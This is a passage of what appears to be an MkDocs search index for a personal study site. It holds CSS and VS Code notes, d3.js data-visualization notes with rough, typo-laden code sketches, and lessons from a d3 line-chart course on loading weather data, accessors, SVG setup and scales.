content + paddings, despite of height of the element.</p> </li> <li> <p>Element.getBoundingClientRect()</p> </li> </ul>"},{"location":"css/spacing/","title":"Spacing","text":"<p>css white space property</p> line breaks char extra while space Text wrapping <code>normal</code> Collapse Collapse Wrap <code>pre</code> Preserve Preserve No wrap <code>nowrap</code> Collapse Collapse No wrap <code>pre-wrap</code> Preserve Preserve Wrap <code>pre-line</code> Preserve Collapse Wrap"},{"location":"custom/config/","title":"Mkdocs \u914d\u7f6e\u89e3\u6790","text":""},{"location":"custom/start/","title":"getting-start","text":""},{"location":"custom/start/#mkdocs","title":"mkdocs \u914d\u7f6e","text":""},{"location":"custom/start/#_1","title":"\u6807\u9898\u5b9a\u5236\u5316","text":"<pre><code>.md-typeset h2 {\n  font-size: 22px; display: inline-block; padding-left: 10px; border-left: 5px solid rgb(145, 109, 213); font-weight:bold;\"\n}\n.md-typeset h3 {\n  text-align: center;\n  font-size: 20px;\n  font-weight: bold;\n  text-decoration: underline;\n  text-decoration-color:rgb(145, 109, 213) ;\n  text-underline-offset: 5px;\n  text-decoration-thickness: 3px;\n  /* position: relative; \u4f7f ::after \u5b9a\u4f4d\u76f8\u5bf9\u4e8e h3 */\n}\n</code></pre>"},{"location":"custom/start/#_2","title":"\u989c\u8272\u5fae\u8c03","text":"<pre><code>[data-md-color-accent='purple'] {\n  --md-accent-fg-color: rgb(145, 109, 213);\n  --md-accent-fg-color--transparent: rgba(145, 109, 213, 0.2);\n  --md-accent-bg-color: #fff;\n  --md-accent-bg-color--light: #ffffffb3;\n}\n</code></pre>"},{"location":"custom/start/#editorwindow-management","title":"Editor/Window Management","text":"Command Key Command id New Window \u21e7\u2318N <code>workbench.action.newWindow</code> Close Window \u2318W <code>workbench.action.closeWindow</code> Close Editor \u2318W <code>workbench.action.closeActiveEditor</code> Close Folder \u2318K F <code>workbench.action.closeFolder</code> Cycle Between Editor Groups unassigned <code>workbench.action.navigateEditorGroups</code> Split Editor \u2318\\ <code>workbench.action.splitEditor</code> Focus into First Editor Group \u23181 <code>workbench.action.focusFirstEditorGroup</code> Focus into Second Editor Group \u23182 <code>workbench.action.focusSecondEditorGroup</code> Focus into Editor Group on the Left unassigned <code>workbench.action.focusPreviousGroup</code> Focus into Editor Group on the Right unassigned <code>workbench.action.focusNextGroup</code> Move Editor Left \u2318K \u21e7\u2318\u2190 <code>workbench.action.moveEditorLeftInGroup</code> Move Editor Right \u2318K \u21e7\u2318\u2192 <code>workbench.action.moveEditorRightInGroup</code> Move Editor into Next Group \u2303\u2318\u2192 <code>workbench.action.moveEditorToNextGroup</code> Move Editor into Previous Group \u2303\u2318\u2190 <code>workbench.action.moveEditorToPreviousGroup</code> New lines Spaces and tabs Text wrapping <code>offsetHeihgt</code> Collapse Collapse Wrap <code>clientHeight</code> Preserve Preserve No wrap <code>scollHeight</code> Collapse Collapse No wrap"},{"location":"datav/","title":"Index","text":"<p>\u6570\u636e\u7c7b\u578b</p> <p>\u96c6\u6210d3.js\u5230react\u4e2d</p>"},{"location":"datav/#webapislibsframework","title":"WebAPIs,libs,framework","text":"<ul> <li>canvas</li> <li>svg</li> <li>WebGL</li> <li>D3.js</li> <li>Echart</li> <li>AntV</li> <li>ZRender</li> <li>Three.js</li> </ul> <ol> <li> <p>Mike Bostock's Blog \u21a9</p> </li> <li> <p>shirleywu \u21a9</p> </li> <li> <p>Ian Johnson \u21a9</p> </li> </ol>"},{"location":"datav/d3/","title":"d3","text":""},{"location":"datav/d3/#know-your-data-set","title":"Know your data set","text":""},{"location":"datav/d3/#types-of-dataquantitative-vs-qualitative","title":"Types of data\uff08quantitative vs  qualitative\uff09","text":"<p><code>qualitative data</code>:  can be put into categories</p> <p></p> <pre><code>type PrecipType/*\u964d\u96e8\u7c7b\u578b*/ = 'rain' | 'snow' | 'hail' | 'sleet' | 'freezing rain'\n}\n</code></pre> <p>Binary data can be placed into only two categories.</p> <pre><code>type IsRaining = false | true\n</code></pre>"},{"location":"datav/d3/#categorical-vs-ordinal","title":"categorical vs ordinal","text":"<p>diamond cut quality (fair, good, very good, ideal) is ordinal, </p> <p>while diamond cut shape (princess, round, marquise, etc.) is categorical.</p> <p></p> <p></p> <pre><code>type DiamondCutShape = 'Round' | 'Princess' | \n'Cushion' | 'Emerald' | 'Oval' | 'Peal'\n</code></pre> <pre><code>type WeatherIcon = 'rainy-day' | 'windy-day' | 'sunny-day'\n</code></pre> <pre><code>enum WindForce {\n  Calm = 0,         // \u65e0\u98ce\n  LightAir = 1,     // \u8f7b\u5fae\n  LightBreeze = 2,  // \u5fae\u98ce\n  GentleBreeze = 3, // \u548c\u98ce\n  ModerateBreeze = 4, // \u6e05\u98ce\n  FreshBreeze = 5,  // \u5f3a\u98ce\n  StrongBreeze = 6, // \u52b2\u98ce\n  NearGale = 7,     // \u75be\u98ce\n  Gale = 8,         // \u5927\u98ce\n  StrongGale = 9,   // \u70c8\u98ce\n  Storm = 10,       // \u72c2\u98ce\n  ViolentStorm = 11, // \u66b4\u98ce\n  Hurricane = 12    // \u98d3\u98ce\n}\n</code></pre> <p>Quantitative Data</p> <p>Discrete data has numerical values that can't be interpolated between</p> <pre><code>enum TyphoonLevel {\n  TropicalDepression = 1,  // \u70ed\u5e26\u4f4e\u538b\n  TropicalStorm = 2,       // \u70ed\u5e26\u98ce\u66b4\n  SevereTropicalStorm = 3, // \u5f3a\u70ed\u5e26\u98ce\u66b4\n  Typhoon = 4,             // \u53f0\u98ce\n  SevereTyphoon = 5,       // \u5f3a\u53f0\u98ce\n  SuperTyphoon = 6         // \u8d85\u5f3a\u53f0\u98ce\n}\n</code></pre> <p>Continuous data</p> <pre><code>interface WeatherStation {\n  id: string,\n  name: string,\n  latitude: number,\n  longtitude: number,\n  temperature: number,\n  humidity:number,\n  dewPoint: number\n}\n</code></pre>"},{"location":"datav/d3/#ways-to-visualize-a-metric","title":"Ways to visualize a metric","text":"<p>The eye is sensitive, to six visual variable. which can be superimposed(\u53e0\u52a0) on the planar figures(\u5e73\u9762\u56fe\u5f62): the size of the marks, their position, texture, color, orientation, and shape</p> <p></p> <p>a scale is a function that takes an abstract value of data, such as the mass of a diamond in carats(\u4ee5\u514b\u62c9\u4e3a\u5355\u4f4d\u7684\u94bb\u77f3\u8d28\u91cf), and returns a visual value such as the horizontal position of a dot in pixels(\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\u7684\u70b9\u7684\u6c34\u5e73\u4f4d\u7f6e). </p> <p>how you might compute x and y for each dot above. Given some values derived from data (minCarat, maxCarat, minPrice, maxPrice) and some from the chart size (width, height), you might do something like this</p> <pre><code>function extend&lt;T&gt;(arr&lt;T&gt;:, accessor?: (d:T)=&gt;:[number,number]) {\n  let mix = Infinity;\n  let max = -Infinity;\n    for (let item of arr) {\n        value = accessor ? accessor(item) : item\n    if ( value &lt; min) min = value\n    if \uff08 value &gt; max) max = value\n  }\n  return [min, max]\n}\n\nfunction xLinearScale(carvet) {\n  return (carat - minCarat) / (maxCarat - minCarat) * width\n}\n\n/*\n    graphics systems put the origin in the top-left corner whereas scatterplots put it in the bottom-left.\n*/ \nfunction yLinearScale(price) {\n  return height - (price - minPrice) / (maxPrice - minPrice) * height\n}\n</code></pre> <p>query element</p> <pre><code>function parseSelector(selector){\nconst bracketIndex = selector.indexOf('[');\nif (bracketIndex &gt; 0) {\n  elemType = selector.slice(0, bracketIndex)\n  attrPart = selector.slice(bracketIndex)\n} else if (bracketIndex === -1) {\n  elemType = selector\n} else {\n  attrPart = selector\n}\n    return { elemType, attrPart }\n}\n\nfunction attrSelector(selector){\n  const {elemType, attrPart} = parseSelector(selector)\n  const attrSelector = attrPart.slice(1,-1)\n\n  if (attrSelector.includes('=')){\n    [attr, value] = attrSelector.split('=')\n  }\n}\n</code></pre> <pre><code>function selectElements(query, Els, findAll = false){\n    let result;  \n\nswitch(query){\n\n    switch(true){\n  case query.startWith('#'): // query string prefix/start with a #\n    result = Els.find(el =&gt; el.getAttribute('id') === query.slice(1)) \n       return result ?  [result] : []\n  case query.startWith('.'): \n     Els.filter(el =&gt; el.classList.contains(query.slice(1))\n        return findAll ? result : result[0]\n  default: \n    result = Els.filter(el =&gt; el.tagName.toLowercase() === query.toLowerCase())\n        return findAll ? result : result[0]\n    }\n    }\n}\n</code></pre> <pre><code>function drawLineChart(){\n\n}\n</code></pre>"},{"location":"datav/d3/#scatterplot","title":"scatterplot\uff08\u6563\u70b9\u56fe\uff09","text":"<pre><code>function drawScatter() {\n  // data Set for API end point\n\n\n  // for data Point\n  const xAccessor = d =&gt; d.dewPoint\n  const yAccessor = d =&gt; d.humidity\n\n\n  // wrapper around native api\n  console.log({\n    d3: d3.min([1,2,null])\n    min: Math.min(...[1.2,null])\n  })\n\n  const width =  d3.min([\n    window.innerWidth * 0.9,\n    windw.innerHeight * 0.9\n  ])\n\n  const DMs = {\n    width,\n    height: width,\n    margin: { // for not touch the edge\n      top: 10,\n      right: 10,\n      bottom: 50,\n      left: 50\n    }\n  }\n\n\n  const bounds = wrapper.append('g')\n    .style('transform', `translate(${dimensions.margin.left}px, ${dimensions.margin.top}px`)\n\n\n  // Draw dots\n\n  const drawDots = (data, color) =&gt; {\n    const dots = bounds.selectAll('circle')\n    .data(data)\n    .enter().append('circle')\n    .attr(\"cx\", d =&gt; scaleX(xAccessor(d)))\n    .attr(\"cy\", d =&gt; scaleY(yAccessor(d)))\n    .attr(\"r\", 5)\n    .attr(\"fill\", color)\n  }\n\n  // Axis \n  const xAxisGenerator = d3.axisBottom()\n    .scale(xScale)\n\n  const xAxis = bound.append('g')\n    .call(xAxisGenerator)\n    .style('transform', `translateY(${dimensions.boundHeight}px)`)\n\n\n\n  // Label\n  const xLabel = xAxis.append('text')\n    .attr('x', dimensions.boundWidth / 2)\n    .attr('y', dimensions.margin.bottom / 2)\n    .text('Dew point (&amp;deg;F)')\n        .attr('fill', 'black')\n    .style('font-size', '1.4em')\n\n  const yLabel = yAxis.append('text')\n    .style('transform', 'rotate(-90deg)')\n    .attr('x', -dimensions.boundHeight / 2)\n    .attr('y', - dimensions.margin.left / 2)\n    .text('Relative Humidity')\n    .style('text-anchor', 'middle')\n}\n</code></pre>"},{"location":"datav/d3/#data-accessor","title":"data accessor","text":"Property Type Description dateTime String A single point of time in a combined date and time representation (<code>{date}T{time}</code>; for example, <code>2017-08-29T04:00:00.0000000</code>). timeZone String Represents a time zone, for example, \"Pacific Standard Time\". See below for more possible values. timeStamp String <pre><code>{\n  dewPoint: -1.67, // \u9732\u70b9\n  humidity: 0.54\n}\n</code></pre>"},{"location":"datav/d3/#reference","title":"reference","text":""},{"location":"datav/d3/#resource-events","title":"Resource events","text":"Event Name Fired When <code>error</code> A resource failed to load. <code>abort</code> The loading of a resource has been aborted. <code>load</code> A resource and its dependent resources have finished loading. <code>beforeunload</code> The window, the document and its resources are about to be unloaded. <code>unload</code> The document or a dependent resource is being unloaded."},{"location":"datav/d3/#network-events","title":"Network events","text":"Event Name Fired When <code>online</code> The browser has gained access to the network. <code>offline</code> <p>resuable chart</p> <p>implement charts as closures with getter-setter methods</p> <pre><code>function chart() {\n  var width = 720, // default width\n      height = 80; // default height\n  function my() {\n    // generate chart here, using `width` and `height`\n  }\n  my.width = function(value) {\n    if (!arguments.length) return width;\n    width = value;\n    return my;\n  };\n  my.height = function(value) {\n    if (!arguments.length) return height;\n    height = value;\n    return my;\n  };\n  return my;\n}\n</code></pre>"},{"location":"datav/d3/#substring-matching-selectors","title":"Substring matching selectors","text":"<p>These selectors allow for more advanced matching of substrings inside the value of your attribute. For example, if you had classes of <code>box-warning</code> and <code>box-error</code> and wanted to match everything that started with the string \"box-\", you could use <code>[class^=\"box-\"]</code> to select them both (or <code>[class|=\"box\"]</code> as described in section above).</p> Selector Example Description <code>[attr^=value]</code> <code>li[class^=\"box-\"]</code> Matches elements with an attr attribute, whose value begins with value. <code>[attr$=value]</code> <code>li[class$=\"-box\"]</code> Matches elements with an attr attribute whose value ends with value. <code>[attr*=value]</code> <code>li[class*=\"box\"]</code> Matches elements with an attr attribute whose value contains value anywhere within the string. <p>[^d3 gallery]show what d3 is capable of</p> <ol> <li> <p>event reference \u21a9</p> </li> </ol>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.00/making-your-first-chart/","title":"Making Your First Chart","text":"<p>Many courses begin by talking about theory and abstract concepts. This is not one of those courses!</p> <p>We'll dig in and create real charts right away! Once you're comfortable making your own charts, we'll discuss how to add animations &amp; interactions, data visualization fundamentals, and practical tips for chart design, along with other goodies.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.00/making-your-first-chart/#course-downloads-code-and-book-pdfs","title":"Course Downloads - Code and Book PDFs","text":"<p>I&gt; This course has Codepens embedded throughout, so you don't need to download any files to go through it. However, if you want to download offline resources, you will find the links for these here: I&gt; I&gt; \ud83d\udc69\u200d\ud83d\udcbb Download the complete set of code for this course here I&gt; I&gt; \ud83d\udcda Download the PDF, EPub, or Mobi (Kindle) of the Fullstack D3 Book I&gt; I&gt; \ud83d\udcbd Download the sample code for the book (note that the book is slightly different than the course) I&gt; I&gt; \ud83c\udfb3 Join us over at the <code>#d3</code> channel in our Discord server - here.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.00/making-your-first-chart/#getting-started","title":"Getting started","text":"<p>To start, let's make a line chart. Line charts are a great starting place because of their popularity, but also because of their simplicity.</p> <p>In this module, we'll create a line chart that plots the daily temperature. Here's what our line chart will look like when we're finished:</p> <p></p> <p>In the tutorial below, don't worry too much about the details! We're just going to get our hands dirty and write the code to build this line chart. This will give us a good foundation to dive deeper into each concept in Modules 2 and 3, in which we'll create more complex charts.</p> <p>The dataset we'll be analyzing contains 365 days of daily weather metrics. To make it easy, we've provided a JSON file with this data which includes 2018 data for New York City.</p> <p>Let's dig in!</p> <p></p> <p>Find the <code>index.html</code> file, this is a very simple webpage \u2014 we're rendering one element and loading one javascript file.</p> <p>{lang=html,crop-start-line=7,crop-end-line=9} &lt;&lt;code/01-making-your-first-chart/completed/index.html</p> <p>The page should be blank except for one <code>div</code> with an <code>id</code> of <code>wrapper</code> \u2014 this is where our chart will live.</p> <p>Our <code>index.html</code> file loads the javascript file in which we'll write our chart code:\u00a0<code>chart.js</code>.</p> <p>Let's open up the <code>chart.js</code> file in a code editor and dig in.</p> <p>We don't have much text in here to start with.</p> <pre><code>async function drawLineChart() {\n    // write your code here\n\n}\n\ndrawLineChart()\n</code></pre> <p>The only thing happening so far is that we're defining a function named <code>drawLineChart()</code> and running it..</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.01/loading-the-weather-dataset/","title":"Loading the weather dataset","text":"<p>The first step to visualizing any dataset is understanding its structure. To get a good look at our data, we need to import it into our webpage. To do this, we will load the JSON file that holds our data.</p> <p>D3.js has methods for fetching and parsing files of different formats in the d3-fetch module, for example, <code>d3.csv()</code>, <code>d3.json()</code>, and <code>d3.xml()</code>. Since we're working with a JSON file, we want to pass our file path to <code>d3.json()</code>.</p> <p>Let's create a new variable named <code>dataset</code> and load it up with the contents of our JSON file.</p> <p>{lang=javascript,crop-query=.dataset} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>A&gt;<code>await</code> is a JavaScript keyword that will pause the execution of a function until a Promise is resolved. This will only work within an async function \u2014 note that the <code>drawLineChart()</code> function declaration is preceded by the keyword <code>async</code>.</p> <p>A&gt;Don't be overwhelmed by the words Promise, async, or await \u2014 this just means that any code (within the function) after <code>await d3.json(\"./../../my_weather_data.json\")</code> will wait to run until <code>dataset</code> is defined. If you're curious and want to learn more, here is a great resource on Promises in JavaScript.</p> <p>T&gt;If you see a <code>SyntaxError: Unexpected end of JSON input</code> error message, check your <code>my_weather_data.json</code> file. It might be empty or corrupted. If so, re-generate your custom data or copy the <code>nyc_weather_data.json</code> file.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.01/loading-the-weather-dataset/#looking-at-our-data","title":"Looking at our data","text":"<p>Going back to our code, let's log our dataset to the console. We can do that by adding the following line of code right after we create our <code>dataset</code> file.</p> <pre><code>console.log(dataset)\n</code></pre> <p>We can see that our dataset is array of objects, with one object per day.</p> <p>Since each day seems to have the same structure, let's delete the last line and instead log a single data point to get a clearer view.</p> <p>A&gt;We can use <code>console.table()</code> here, which is a great function for looking at array or object values \u2014 as long as there aren't too many!</p> <pre><code>console.table(dataset[0])\n</code></pre> <p>{width=40%} </p> <p>We have lots of information for each day! We can see metadata (<code>date</code>, <code>time</code>, <code>summary</code>) and details about that day's weather (<code>cloudCover</code>, <code>sunriseTime</code>, <code>temperatureMax</code>, etc). If you want to read more about each metric, check out The Dark Sky API docs.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.01/loading-the-weather-dataset/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.02/setting-up-our-line-chart/","title":"Setting up our line chart","text":"<p>Let's dig in by looking at <code>temperatureMax</code> over time. Our timeline will have two axes:</p> <ul> <li>a y axis (vertical) on the left comprised of max temperature values</li> <li>an x axis (horizontal) on the bottom comprised of dates</li> </ul> <p>To grab the correct metrics from each data point, we'll need accessor functions. Accessor functions convert a single data point into the metric value.</p> <p>Lets try it out by creating a <code>yAccessor</code> function that will take a data point and return the max temperature.</p> <p>A&gt;If you think of a dataset as a table, a data point would be a row in that table. In this case, a data point represents an item in our <code>dataset</code> array: an object that holds the weather data for one day.</p> <p>We will use <code>yAccessor</code> for plotting points on the y axis.</p> <p>Looking at the data point in our console, we can see that a day's max temperature is located on the object's <code>temperatureMax</code> key. To access this value, our <code>yAccessor</code> function looks like this:</p> <p>{lang=javascript,crop-query=.yAccessor} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Next, we'll need an <code>xAccessor</code> function that will return a point's date, which we will use for plotting points on the x axis.</p> <pre><code>const xAccessor = d =&gt; d.date\n</code></pre> <p>But look closer at the data point <code>date</code> value - notice that it is a string (eg. <code>\"2018-12-25\"</code>). Unfortunately, this string won't make sense on our x axis. How could we know how far <code>\"2018-12-25\"</code> is from <code>\"2018-12-29\"</code>?.</p> <p>We need to convert the string into a JavaScript Date, which is an object that represents a single point in time. Thankfully, d3 has a d3-time-format module with methods for parsing and formatting dates.</p> <p>The <code>d3.timeParse()</code> method...</p> <ul> <li>takes a string specifying a date format, and</li> <li>outputs a function that will parse dates of that format.</li> </ul> <p>For example, <code>d3.timeParse(\"%Y\")</code> will parse a string with just a year (eg. <code>\"2018\"</code>).</p> <p>Let's create a date parser function and use it to transform our date strings into date objects:</p> <p>{lang=javascript,crop-query=.dateParser-.xAccessor} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Great! Now when we call <code>xAccessor(dataset[0])</code>, we'll get the first day's date.</p> <p>A&gt;If you look up d3 examples, you won't necessarily see accessor functions used. When I first started learning d3, I never thought about using them. Since then, I've learned my lesson and paid the price of painstakingly picking through old code and updating individual lines. I want to save you that time so you can spend it making even more wonderful charts.</p> <p>Defining accessor functions might seem like unnecessary overhead right now, especially with this simple example. However, creating a separate function to read the values from our data points helps us in a few ways.</p> <ul> <li>Easy changes: every chart is likely to change at least once \u2014 whether that change is due to business requirements, design, or data structure. These changing requirements are especially prevalent when creating dashboards with dynamic data, where you might need to handle a new edge case two months later. Having the accessor functions in one place at the top of a chart file makes them easy to update throughout the chart.</li> <li>Documentation: having these functions at the top of a file can give you a quick reminder of what metrics the chart is plotting and the structure of the data.</li> <li>Framing: sitting down with the data and planning what metrics we'll need to access is a great way to start making a chart. It's tempting to rush in, then two hours later realize that another type of chart would be better suited to the data.</li> </ul> <p>Now that we know how to access our dataset, we need to prepare to draw our chart.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.02/setting-up-our-line-chart/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.03/drawing-our-chart/","title":"Drawing our chart","text":"<p>When drawing a chart, there are two containers whose dimensions we need to define: the wrapper and the bounds.</p> <p></p> <p>The wrapper contains the entire chart: the data elements, the axes, the labels, etc. Every SVG element will be contained inside here.</p> <p>The bounds contain all of our data elements: in this case, our line.</p> <p>This distinction will help us separate the amount of space we need for extraneous elements (axes, labels), and let us focus on our main task: plotting our data. One reason this is so important to define up front is the inconsistent and unfamiliar way SVG elements are sized.</p> <p>When adding a chart to a webpage, we start with the amount of space we have available for the chart. Then we decide how much space we need for the margins, which will accommodate the chart axes and labels. What's left is how much space we have for our data elements.</p> <p>We will rarely have the option to decide how large our timeline is and then build up from there. Our charts will need to be accommodating of window sizes, surrounding text, and more.</p> <p>A&gt; While wrapper and bounds isn't terminology that you'll see in widespread use, it will be helpful for reference in this book. Defining these concepts also helps with thinking about chart dimensions and remembering to make space for your axes.</p> <p>Let's define a dimensions object that will contain the size of the wrapper and the margins. We'll have one margin defined for each side of the chart: top, right, bottom, and left. For consistency, we'll mimic the order used for CSS properties.</p> <p>{lang=javascript,crop-query=.dimensions} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>We want a small <code>top</code> and <code>right</code> margin to give the chart some space. The line or the y axis might overflow the chart bounds. We'll want a larger <code>bottom</code> and <code>left</code> margin to create room for our axes.</p> <p>Let's compute the size of our bounds and add that to our <code>dimensions</code> object.</p> <p>{lang=javascript,crop-query=context(.dimensions.boundedWidth, 0, 6)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.03/drawing-our-chart/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.04/creating-our-workspace/","title":"Creating our workspace","text":"<p>Now we're set up and ready to start updating our webpage!</p> <p>To add elements to our page, we'll need to specify an existing element that we want to append to.</p> <p>Remember the <code>#wrapper</code> element already populated in <code>index.html</code>? One of d3's modules, d3-selection, has helper functions to select from and modify the DOM.</p> <p>We can use <code>d3.select()</code> , which accepts a CSS-selector-like string and returns the first matching DOM element (if any). If you're unfamiliar with CSS selector syntax, there are three main types of selectors:</p> <ul> <li>you can select all elements with a class name (<code>.class</code>)</li> <li>you can select all elements with an id (<code>#id</code>), or</li> <li>you can select all elements of a specific node type (<code>type</code>).</li> </ul> <p>A&gt; If you've ever used jQuery or written CSS selectors, these selector strings will be familiar.</p> <pre><code>const wrapper = d3.select(\"#wrapper\")\n</code></pre> <p>Let's log our new <code>wrapper</code> variable to the console to see what it looks like.</p> <pre><code>console.log(wrapper)\n</code></pre> <p>We can see that it's a d3 selection object, with <code>_groups</code> and <code>_parents</code> keys.</p> <p></p> <p>d3 selection objects are a subclass of Array. They have a lot of great methods that we'll explore in depth later - what's important to us right now is the <code>_groups</code> list that contains our <code>#wrapper</code> div.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.04/creating-our-workspace/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.05/adding-an-svg-element/","title":"Adding an SVG element","text":"<p>Our <code>wrapper</code> object also has methods for manipulating the linked DOM element \u2014 let's use its <code>append</code> method to add a new SVG element.</p> <pre><code>const wrapper = d3.select(\"#wrapper\")\nconst svg = wrapper.append(\"svg\")\n</code></pre> <p>If we log <code>svg</code> to the console, we'll see that it looks like our <code>wrapper</code> object. However, if we expand the <code>_groups</code> key, we'll see that the linked element is our new <code>&lt;svg&gt;</code> element.</p> <p>One trick to make sure we're grabbing the correct element is to hover the logged DOM element. If we expand the <code>_groups</code> object and hover over the <code>&lt;svg&gt;</code> element, the browser will highlight the corresponding DOM element on the webpage.</p> <p></p> <p>A&gt;If you're working within CodeSandbox, you'll need to do this in your browser's native dev tools.</p> <p>On hover, the browser will also show the element's size: 300px by 150px. This is the default size for SVG elements in Google Chrome, but it will vary between browsers and even browser versions. SVG elements don't scale the way most DOM elements do \u2014 there are many rules that will be unfamiliar to an experienced web developer.</p> <p>To maintain control, let's tell our <code>&lt;svg&gt;</code> element what size we want it to be.</p> <p>d3 selection objects have an <code>.attr()</code> method that will add or replace an attribute on the selected DOM element. The first argument is the attribute name and the second argument is the value.</p> <p>T&gt; The value argument to <code>.attr()</code> can either be a constant, which is all we need right now, or a function, which we'll cover later.</p> <pre><code>const wrapper = d3.select(\"#wrapper\")\nconst svg = wrapper.append(\"svg\")\nsvg.attr(\"width\", dimensions.width)\nsvg.attr(\"height\", dimensions.height)\n</code></pre> <p>Most <code>d3-selection</code> methods will return a selection object.</p> <ul> <li>any method that selects or creates a new object will return the new selection</li> <li>any method that manipulates the current selection will return the same selection</li> </ul> <p>This allows us to keep our code concise by chaining when we're using multiple methods. For example, we can rewrite the above code as:</p> <pre><code>const wrapper = d3.select(\"#wrapper\")\nconst svg = wrapper.append(\"svg\")\n    .attr(\"width\", dimensions.width)\n    .attr(\"height\", dimensions.height)\n</code></pre> <p>In this book, we'll follow the common d3 convention of using 4 space indents for methods that return the same selection. This will make it easy to spot when our selection changes.</p> <p>Since we're not going to re-use the <code>svg</code> variable, we can rewrite the above code as:</p> <p>{lang=javascript,crop-query=.wrapper} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>When we refresh our <code>index.html</code> page, we should now see that our <code>&lt;svg&gt;</code> element is the correct size. Great!</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.05/adding-an-svg-element/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.06/creating-our-bounding-box/","title":"Creating our bounding box","text":"<p>Our SVG element is the size we wanted, but we want our chart to respect the margins we specified.</p> <p>Let's create a group that shifts its contents to respect the top and left margins so we can deal with those in one place.</p> <p>Any elements inside of an <code>&lt;svg&gt;</code> have to be SVG elements (with the exception of <code>&lt;foreignObject&gt;</code> which is fiddly to work with). Since we'll be inserting new chart elements inside of our <code>&lt;svg&gt;</code>, we'll need to use SVG elements for the rest of the chart.</p> <p>The <code>&lt;g&gt;</code> SVG element is not visible on its own, but is used to group other elements. Think of it as the <code>&lt;div&gt;</code> of SVG \u2014 a wrapper for other elements. We can draw our chart inside of a <code>&lt;g&gt;</code> element and shift it all at once using the CSS <code>transform</code> property.</p> <p>d3 selection objects have a <code>.style()</code> method for adding and modifying CSS styles. The <code>.style()</code> method is invoked similarly to <code>.attr()</code> and takes a key-value pair as its first and second arguments. Let's use <code>.style()</code> to shift our bounds.</p> <p>{lang=javascript,crop-query=.bounds} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>A&gt;We're using backticks (<code>`</code>) instead of quotes (<code>'</code> or <code>\"</code>) to create our <code>translate</code> string. This lets us use ES6 string interpolation \u2014 if you're unfamiliar, read more here.</p> <p>If we look at our Elements panel, we can see our new <code>&lt;g&gt;</code> element.</p> <p></p> <p>We can see that the <code>&lt;g&gt;</code> element size is 0px by 0px \u2014 instead of taking a <code>width</code> or <code>height</code> attribute, a <code>&lt;g&gt;</code> element will expand to fit its contents. When we start drawing our chart, we'll see this in action.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.06/creating-our-bounding-box/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.07/creating-our-scales/","title":"Creating our scales","text":"<p>Let's get back to the data.</p> <p>On our y axis, we want to plot the max temperature for every day.</p> <p>Before we draw our chart, we need to decide what temperatures we want to visualize. Do we need to plot temperatures over 1,000\u00b0F or under 0\u00b0F? We could hard-code a standard set of temperatures, but that range could be too large (making the data hard to see), or it could be too small or offset (cutting off the data). Instead, let's use the actual range by finding the lowest and highest temperatures in our dataset.</p> <p>A&gt;We've all seen over-dramatized timelines with a huge drop, only to realize that the change is relatively small. When defining an axis, we'll often want to start at 0 to show scale. We'll go over this more when we talk about types of data.</p> <p>As an example, let's grab a sample day's data \u2014 say it has a maximum temperature of 55\u00b0F. We could draw our point 55 pixels above the bottom of the chart, but that won't scale with our <code>boundedHeight</code>.</p> <p>Additionally, if our lowest temperature is below 0 we would have to plot that value below the chart! Our y axis wouldn't be able to handle all of our temperature values.</p> <p>To plot the max temperature values in the correct spot, we need to convert them into pixel space.</p> <p>d3's d3-scale module can create different types of scales. A scale is a function that converts values between two domains.</p> <p>For our y axis, we want to convert values from the temperature domain to the pixel domain. If our chart needs to handle temperatures from 10\u00b0F to 100\u00b0F, a day with a max of 55\u00b0F will be halfway up the y axis.</p> <p>Let's create a scale that converts those degrees into a y value. If our y axis is 200px tall, the y scale should convert 55\u00b0F into 100, the halfway point on the y axis.</p> <p>{width=50%} </p> <p>d3-scale can handle many different types of scales - in this case, we want to use <code>d3.scaleLinear()</code> because our y axis values will be numbers that increase linearly. To create a new scale, we need to create an instance of <code>d3.scaleLinear()</code>.</p> <p>{lang=javascript,crop-query=context(.yScale, 0, -2)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Our scale needs two pieces of information:</p> <ul> <li>the domain: the minimum and maximum input values</li> <li>the range: the minimum and maximum output values</li> </ul> <p>Let's start with the domain. We'll need to create an array of the smallest and largest numbers our y axis will need to handle \u2014 in this case the lowest and highest max temperature in our dataset.</p> <p>The d3-array module has a <code>d3.extent()</code> method for grabbing those numbers. <code>d3.extent()</code> takes two parameters:</p> <ol> <li>an array of data points</li> <li>an accessor function which defaults to an identity function (<code>d =&gt; d</code>)</li> </ol> <p>Let's test this out by logging <code>d3.extent(dataset, yAccessor)</code> to the console. The output should be an array of two values: the minimum and maximum temperature in our dataset. Perfect!</p> <p>Let's plug that into our scale's domain:</p> <p>{lang=javascript,crop-query=context(.yScale, 0, -1)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Next, we need to specify the range. As a reminder, the range is the highest and lowest number we want our scale to output \u2014 in this case, the maximum &amp; minimum number of 